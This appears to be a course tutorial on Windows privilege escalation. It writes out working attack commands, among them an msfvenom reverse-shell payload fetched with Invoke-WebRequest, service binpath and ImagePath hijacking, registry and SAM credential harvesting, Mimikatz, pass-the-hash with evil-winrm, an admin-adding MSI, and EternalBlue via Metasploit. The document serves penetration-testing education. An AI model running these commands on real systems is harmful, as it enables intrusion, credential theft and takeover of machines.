# 02 - Windows Privilege Escalation Techniques

## Introduction

Windows Privilege Escalation (Privesc) is the process by which an attacker elevates their privileges on a Windows operating system using various methods. This grants the attacker greater access and control over the system and is critical for progressing within a network and performing lateral movement.

### Movement Types

- Vertical Movement: The attacker elevates the privileges of the current user account (privilege escalation).
- Horizontal Movement: The attacker gains access to another user account with the same privilege level.

Privilege escalation refers to vertical movement.

## Techniques

While privilege escalation tools are useful, the fundamentals are crucial. On restricted systems without internet or external tools, PowerShell and built-in Windows utilities are often the only options.

- Software Vulnerabilities: Exploiting OS or application flaws.
- Misconfigured Systems: Configuration errors that permit privilege escalation.
- Social Engineering: Convincing users to perform actions that grant higher privileges.

## Reasons

Many organizations lack resources for timely patching, scans, and upgrades. This creates windows of opportunity for attackers.

## Information Gathering

Accurate recon is critical. Below are common built-in commands and techniques used to gather information on Windows targets.

### Gathering System Information

Example PowerShell:

```
PS C:\Users\user> Get-ComputerInfo
WindowsProductName : Windows 10 Enterprise LTSC 2021
WindowsVersion     : 2009
... 
```

### Gathering Network Information

```
PS C:\Users\user> Get-NetIPAddress
PS C:\Users\user> ipconfig
PS C:\Users\user> arp -a
```

### Local Users and Groups

```
PS C:\Users\user> Get-LocalUser
PS C:\Users\user> Get-LocalGroup
```

### PowerShell History

PowerShell history can reveal useful commands:

```
cat (Get-PSReadlineOption).HistorySavePath
```

Module logging and event logs:

```
Get-WinEvent -LogName "Windows PowerShell"
```

Scrape the clipboard if sensitive data may be present:

```
Get-Clipboard
```

### AccessChk (Sysinternals)

AccessChk reveals effective permissions across services, files, registry keys, etc. Useful for finding misconfigurations you can abuse.

```
.\accesschk64.exe -uwcqv <USER> * /accepteula
.\accesschk64.exe -ucqv <SERVICE> /accepteula
```

## Elevating Privileges by Stealing Passwords, Sessions, or Hashes

PowerShell and tools like Mimikatz can extract credentials, tokens, and hashes which may be used for pass-the-hash or pass-the-ticket attacks.

### General Password Search

Search for files containing the word "password":

```
cd "C:\Program Files"
Get-ChildItem -Recurse -ErrorAction SilentlyContinue | Select-String "password" -List | select path | where path -like "*.conf"
```

### Winlogon / Autologon

Check for stored autologon credentials in registry:

```
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" DefaultUserName
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" DefaultPassword
```

### Service Passwords and Sessions

```
Get-ItemProperty "HKCU:\Software\ORL\WinVNC3\Password"
Get-ItemProperty "HKLM:\Software\TightVNC\Server" Password
Get-ItemProperty "HKCU\Software\SimonTatham\PuTTY\Sessions"
```

### Browser Passwords and DPAPI

Tools and techniques exist to extract browser stored credentials (Mimikatz `dpapi::chrome`) when you can obtain the DPAPI masterkey.

### SAM and Credential Dumps

The SAM hive stores local account hashes at `C:\Windows\System32\config\SAM`. Offline copies or backups may be useful (e.g., `RegBack`). Tools like Creddump can extract these.

## Pass-the-Hash

Captured NTLM hashes may be reused to authenticate without cracking the password (e.g., `evil-winrm -u <USER> -H <HASH> -i <IP>`).

## Elevating Privileges Using Services

If you can modify a service configuration, replace its binary, or change its ImagePath, you can achieve code execution as the service's account (often SYSTEM).

### Required Executable

Create a payload (e.g., msfvenom) and transfer it to the target using a simple HTTP server and `Invoke-WebRequest`.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4343 -f exe -o reverse.exe
python -m http.server
Invoke-WebRequest -Uri "http://<IP>:8000/reverse.exe" -OutFile .\Desktop\reverse.exe
```

### Service Permissions

Use AccessChk to find services the current user can modify. If you have `SERVICE_CHANGE_CONFIG`, change the `binpath` to an executable you control and start the service.

```
sc.exe config svcconfig binpath="C:\Users\user\Desktop\reverse.exe"
start-service svcconfig
```

If the service runs as SYSTEM, you'll get a SYSTEM shell when it starts.

### Unquoted Service Paths

Unquoted service paths with spaces can be abused if you can write to directories earlier in the search order. Check service ImagePath and file ACLs; if you can place an executable in the parsed path, it will be launched by the service.

### Modifying via Registry

If you can modify service registry keys (e.g., `HKLM\System\CurrentControlSet\Services\svcregistry`), change `ImagePath` to your executable and start the service.

```
Set-ItemProperty HKLM:\System\CurrentControlSet\Services\svcregistry -name ImagePath -Value 'C:\Users\user\Desktop\reverse.exe'
start-service svcregistry
```

### Insecure Executable Files

If `BUILTIN\Users` (or your account) has write permissions on the service executable, overwrite it and start the service.

```
cp .\reverse.exe 'C:\Program Files\FilePerms\service.exe'
start-service svcfileperms
```

## Auto-Start Programs

### Task Scheduler

Search scheduled tasks (excluding Microsoft tasks) and check the files they execute. Writable scripts invoked by tasks can be replaced to achieve escalation when the task runs as a higher-privileged user.

```
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | select *
```

If the scheduled script is writable by you, replace it with a reverse shell payload.

### Registry AutoRun

Startup entries in the registry (`HKLM`/`HKCU` Run and RunOnce keys) may be abused if you can write to them or the target executable.

## AlwaysInstallElevated

When `AlwaysInstallElevated` is set (`HKLM` and `HKCU` both = 1), standard users can install MSI packages with elevated privileges. You can craft an MSI (e.g., via msfvenom) to create a local admin user.

```
msfvenom -p windows/adduser USER=newadmin PASS='Password123!' -f msi -o newadmin.msi
Invoke-WebRequest -Uri "http://<IP>:8000/newadmin.msi" -OutFile .\Desktop\newadmin.msi
```

Double-clicking (or running) the MSI will create the user if the policy is enabled.

## Windows NT / Kernel Exploits

Kernel and service-level vulnerabilities may be exploited for RCE and privilege escalation. Examples include EternalBlue (MS17-010), MS08-067, and MS16-032. Metasploit has modules for many of these vulnerabilities.

```
msf > use exploit/windows/smb/ms17_010_eternalblue
msf > set RHOST <IP>
msf > run
```

Only use such exploits on authorized test systems.

## Tokens and User Privileges

Windows privileges (e.g., SeImpersonatePrivilege, SeDebugPrivilege, SeTakeOwnershipPrivilege) grant capabilities beyond file ACLs and are often targeted during escalation.

### SeImpersonatePrivilege and PrintSpoofer

SeImpersonatePrivilege allows a process to impersonate other users. Tools like PrintSpoofer can leverage SeImpersonate to obtain a SYSTEM token via the Print Spooler service and execute commands as SYSTEM.

https://github.com/itm4n/PrintSpoofer

### SeDebugPrivilege

SeDebugPrivilege allows reading or dumping process memory (e.g., LSASS). Tools like ProcDump or Mimikatz can dump LSASS to extract credentials.

### SeTakeOwnershipPrivilege

SeTakeOwnershipPrivilege allows taking ownership of objects even without permissions; in an AD environment this can be powerful for lateral movement and extracting secrets.

## Final Notes

Windows privilege escalation blends careful enumeration (PowerShell, AccessChk, task/service inspection), abuse of misconfigurations (service configs, scheduled tasks, unquoted paths, weak ACLs), credential harvesting (Mimikatz, DPAPI, SAM), and selective use of exploits or tools (when authorized).

Always perform these techniques in lab environments or on systems where you have explicit authorization.

---

Practice the exercises in a dedicated lab VM to gain hands-on experience with these techniques.


